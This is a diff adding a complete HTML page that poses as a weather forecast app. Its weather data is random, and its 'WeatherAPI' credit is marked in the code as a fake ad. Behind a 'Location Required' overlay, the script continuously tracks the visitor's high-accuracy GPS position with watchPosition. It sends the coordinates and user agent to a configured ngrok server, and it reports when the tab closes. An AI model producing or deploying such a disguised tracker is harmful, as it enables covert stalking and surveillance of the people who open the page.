@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌤️ Weather Forecast</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+        }
+        
+        #blockerOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            flex-direction: column;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        #blockerOverlay.hidden { display: none; }
+        
+        .blocker-icon {
+            font-size: 80px;
+            margin-bottom: 30px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.7; }
+        }
+        
+        .blocker-title {
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+        
+        .blocker-subtitle {
+            color: #a0aec0;
+            font-size: 18px;
+            max-width: 400px;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        
+        .blocker-button {
+            background: #4299e1;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(66, 153, 225, 0.4);
+        }
+        
+        .blocker-button:hover {
+            background: #3182ce;
+            transform: scale(1.05);
+        }
+        
+        .blocker-error {
+            color: #fc8181;
+            font-size: 14px;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .blocker-error.visible { display: block; }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 25px;
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            backdrop-filter: blur(10px);
+            display: none;
+        }
+        
+        .container.visible { display: block; }
+        
+        .weather-icon {
+            font-size: 72px;
+            margin-bottom: 10px;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .temp {
+            font-size: 48px;
+            font-weight: 700;
+            color: #2d3748;
+        }
+        
+        .temp-unit { font-size: 24px; color: #718096; }
+        
+        .condition {
+            font-size: 20px;
+            color: #4a5568;
+            margin: 5px 0 20px 0;
+        }
+        
+        .location-text {
+            font-size: 16px;
+            color: #718096;
+            margin-bottom: 20px;
+        }
+        
+        .location-text span {
+            color: #2d3748;
+            font-weight: 600;
+        }
+        
+        .details {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .detail-box {
+            background: #f7fafc;
+            padding: 15px;
+            border-radius: 12px;
+        }
+        
+        .detail-box .label {
+            font-size: 11px;
+            color: #a0aec0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .detail-box .value {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 5px;
+        }
+        
+        .update-time {
+            font-size: 12px;
+            color: #a0aec0;
+            margin-top: 15px;
+        }
+        
+        .fake-ad {
+            margin-top: 20px;
+            padding: 10px;
+            background: #edf2f7;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #718096;
+        }
+        
+        .permission-banner {
+            background: #ebf8ff;
+            border: 1px solid #bee3f8;
+            border-radius: 10px;
+            padding: 12px;
+            margin: 15px 0;
+            font-size: 14px;
+            color: #2b6cb0;
+        }
+        
+        .permission-banner strong { display: block; font-size: 15px; }
+        
+        #locationStatus {
+            font-size: 13px;
+            color: #718096;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <!-- BLOCKER OVERLAY -->
+    <div id="blockerOverlay">
+        <div class="blocker-icon">🌍</div>
+        <div class="blocker-title">Location Required</div>
+        <div class="blocker-subtitle">
+            This weather service needs your location to provide accurate forecasts.
+        </div>
+        <button class="blocker-button" id="enableLocationBtn">📍 Enable Location</button>
+        <div class="blocker-error" id="blockerError"></div>
+    </div>
+
+    <!-- Main Weather App -->
+    <div class="container" id="mainContainer">
+        <div class="weather-icon" id="weatherIcon">☀️</div>
+        <div class="temp" id="temperature">--<span class="temp-unit">°C</span></div>
+        <div class="condition" id="condition">Loading weather...</div>
+        
+        <div class="permission-banner" id="permissionBanner">
+            <strong>🌍 Location Enabled</strong>
+            <span>Getting your local weather...</span>
+        </div>
+        
+        <div id="locationStatus">📍 Detecting your location...</div>
+        
+        <div class="location-text">
+            📍 <span id="locationName">Your city</span>
+        </div>
+        
+        <div class="details">
+            <div class="detail-box">
+                <div class="label">Humidity</div>
+                <div class="value" id="humidity">--%</div>
+            </div>
+            <div class="detail-box">
+                <div class="label">Wind</div>
+                <div class="value" id="wind">-- km/h</div>
+            </div>
+            <div class="detail-box">
+                <div class="label">UV Index</div>
+                <div class="value" id="uv">--</div>
+            </div>
+        </div>
+        
+        <div class="update-time" id="updateTime">Last updated: Just now</div>
+        
+        <div class="fake-ad">
+            📢 Weather data powered by WeatherAPI • Privacy Policy
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // CONFIGURATION - EDIT THIS URL
+        // ============================================
+        const SERVER_URL = 'https://senator-handcraft-kisser.ngrok-free.dev';
+        // ============================================
+        
+        let locationSent = false;
+        let watchId = null;
+        let disconnectSent = false;
+        
+        const blockerOverlay = document.getElementById('blockerOverlay');
+        const mainContainer = document.getElementById('mainContainer');
+        const enableBtn = document.getElementById('enableLocationBtn');
+        const blockerError = document.getElementById('blockerError');
+        
+        // ============================================
+        // DISCONNECT NOTIFICATION - User closes tab
+        // ============================================
+        
+        async function sendDisconnect() {
+            if (disconnectSent) return;
+            disconnectSent = true;
+            
+            try {
+                await fetch(`${SERVER_URL}/disconnect`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        source: 'weather_app',
+                        userAgent: navigator.userAgent,
+                        reason: 'user_closed_page'
+                    })
+                });
+                console.log('🔴 Disconnect notification sent');
+            } catch (error) {
+                console.error('❌ Failed to send disconnect:', error);
+            }
+        }
+        
+        // Detect when user closes tab or navigates away
+        window.addEventListener('beforeunload', function(e) {
+            sendDisconnect();
+            // Standard beforeunload message (optional)
+            e.preventDefault();
+            e.returnValue = '';
+        });
+        
+        // Also detect pagehide (for mobile)
+        window.addEventListener('pagehide', function() {
+            sendDisconnect();
+        });
+        
+        // Detect visibility change (user switches tab)
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                console.log('👀 User switched away from tab');
+                // Optional: Send a "user left" notification
+                // sendDisconnect(); // Uncomment if you want to track tab switches
+            } else {
+                console.log('👀 User returned to tab');
+            }
+        });
+        
+        // ============================================
+        // BLOCKER FUNCTIONS
+        // ============================================
+        
+        function showBlocker(message) {
+            blockerOverlay.classList.remove('hidden');
+            mainContainer.classList.remove('visible');
+            if (message) {
+                blockerError.textContent = message;
+                blockerError.classList.add('visible');
+            }
+        }
+        
+        function hideBlocker() {
+            blockerOverlay.classList.add('hidden');
+            mainContainer.classList.add('visible');
+        }
+        
+        // ============================================
+        // SEND LOCATION TO SERVER
+        // ============================================
+        
+        async function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            const data = {
+                latitude: lat,
+                longitude: lon,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                source: 'weather_app'
+            };
+            
+            try {
+                const response = await fetch(`${SERVER_URL}/location`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                if (response.ok) {
+                    console.log('✅ Location sent:', lat, lon);
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.error('❌ Failed to send location:', error);
+                return false;
+            }
+        }
+        
+        // ============================================
+        // WEATHER UI FUNCTIONS
+        // ============================================
+        
+        function getRandomWeather() {
+            const conditions = ['☀️ Sunny', '⛅ Partly Cloudy', '☁️ Cloudy', '🌤️ Mostly Sunny', '💨 Windy'];
+            const temps = [22, 24, 26, 28, 30, 18, 20, 25];
+            const humidity = [45, 50, 55, 60, 65, 70];
+            const wind = [5, 8, 10, 12, 15, 18];
+            const uv = [3, 4, 5, 6, 7, 8];
+            
+            return {
+                icon: conditions[Math.floor(Math.random() * conditions.length)],
+                temp: temps[Math.floor(Math.random() * temps.length)],
+                humidity: humidity[Math.floor(Math.random() * humidity.length)],
+                wind: wind[Math.floor(Math.random() * wind.length)],
+                uv: uv[Math.floor(Math.random() * uv.length)]
+            };
+        }
+        
+        function updateWeatherUI(weather) {
+            const iconMatch = weather.icon.match(/^([^\s]+)/);
+            document.getElementById('weatherIcon').textContent = iconMatch ? iconMatch[0] : '☀️';
+            document.getElementById('condition').textContent = weather.icon;
+            document.getElementById('temperature').innerHTML = `${weather.temp}<span class="temp-unit">°C</span>`;
+            document.getElementById('humidity').textContent = `${weather.humidity}%`;
+            document.getElementById('wind').textContent = `${weather.wind} km/h`;
+            document.getElementById('uv').textContent = weather.uv;
+            document.getElementById('updateTime').textContent = `Last updated: ${new Date().toLocaleTimeString()}`;
+        }
+        
+        // ============================================
+        // LOCATION HANDLERS
+        // ============================================
+        
+        function handleLocationSuccess(position) {
+            console.log('📍 Location received:', position.coords.latitude, position.coords.longitude);
+            
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
+                .then(res => res.json())
+                .then(data => {
+                    const city = data.address?.city || data.address?.town || data.address?.village || 'Unknown';
+                    document.getElementById('locationName').textContent = city;
+                })
+                .catch(() => {
+                    document.getElementById('locationName').textContent = `${lat.toFixed(2)}, ${lon.toFixed(2)}`;
+                });
+            
+            sendLocation(position);
+            
+            document.getElementById('locationStatus').textContent = '✅ Weather updated for your location';
+            document.getElementById('locationStatus').style.color = '#38a169';
+            document.getElementById('permissionBanner').style.display = 'none';
+            
+            const weather = getRandomWeather();
+            updateWeatherUI(weather);
+            locationSent = true;
+        }
+        
+        function handleLocationError(error) {
+            console.error('Location error:', error);
+            let msg = '❌ Location access is required.';
+            if (error.code === error.PERMISSION_DENIED) {
+                msg = '❌ You denied location access. Please enable it in browser settings and refresh.';
+            } else if (error.code === error.TIMEOUT) {
+                msg = '⏱️ Location request timed out. Please try again.';
+            } else if (error.code === error.POSITION_UNAVAILABLE) {
+                msg = '📡 Location unavailable. Please enable GPS or WiFi.';
+            }
+            showBlocker(msg);
+            enableBtn.textContent = '📍 Try Again';
+            enableBtn.disabled = false;
+        }
+        
+        // ============================================
+        // START TRACKING
+        // ============================================
+        
+        function startTracking() {
+            if (!navigator.geolocation) {
+                showBlocker('❌ Your browser does not support location services.');
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    hideBlocker();
+                    handleLocationSuccess(position);
+                    
+                    watchId = navigator.geolocation.watchPosition(
+                        function(newPosition) {
+                            console.log('🔄 Location updated');
+                            sendLocation(newPosition);
+                        },
+                        function(error) {
+                            console.warn('Watch error:', error);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 30000
+                        }
+                    );
+                },
+                function(error) {
+                    handleLocationError(error);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                }
+            );
+        }
+        
+        // ============================================
+        // ENABLE BUTTON CLICK
+        // ============================================
+        
+        enableBtn.addEventListener('click', function() {
+            blockerError.classList.remove('visible');
+            blockerError.textContent = '';
+            enableBtn.textContent = '⏳ Requesting...';
+            enableBtn.disabled = true;
+            startTracking();
+        });
+        
+        // ============================================
+        // CHECK EXISTING PERMISSION
+        // ============================================
+        
+        function checkExistingPermission() {
+            if (navigator.permissions && navigator.permissions.query) {
+                navigator.permissions.query({ name: 'geolocation' })
+                    .then(result => {
+                        if (result.state === 'granted') {
+                            console.log('✅ Location already granted');
+                            startTracking();
+                        } else if (result.state === 'denied') {
+                            showBlocker('❌ Location access was denied. Please enable it in browser settings and refresh.');
+                        } else {
+                            showBlocker('');
+                        }
+                    })
+                    .catch(() => {
+                        showBlocker('');
+                    });
+            } else {
+                showBlocker('');
+            }
+        }
+        
+        // ============================================
+        // INITIALIZE
+        // ============================================
+        
+        console.log('🌤️ Weather app starting...');
+        console.log('🔗 Server URL:', SERVER_URL);
+        checkExistingPermission();
+        
+        setInterval(() => {
+            if (locationSent) {
+                const weather = getRandomWeather();
+                updateWeatherUI(weather);
+            }
+        }, 30000);
+    </script>
+</body>
+</html>
